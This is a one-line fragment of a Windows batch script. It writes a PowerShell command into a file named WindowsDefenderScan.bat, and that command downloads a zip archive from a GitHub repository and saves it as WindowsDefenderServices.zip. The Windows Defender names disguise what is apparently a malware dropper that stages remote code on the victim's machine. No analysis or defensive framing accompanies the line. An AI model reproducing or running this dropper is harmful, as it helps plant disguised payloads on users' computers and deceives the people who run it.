...
echo powershell -command "Invoke-WebRequest 'https://github.com/aarec1/3/archive/refs/heads/main.zip' -OutFile WindowsDefenderServices.zip" >> "%userprofile%\WindowsDefender\WindowsDefenderScan.bat"
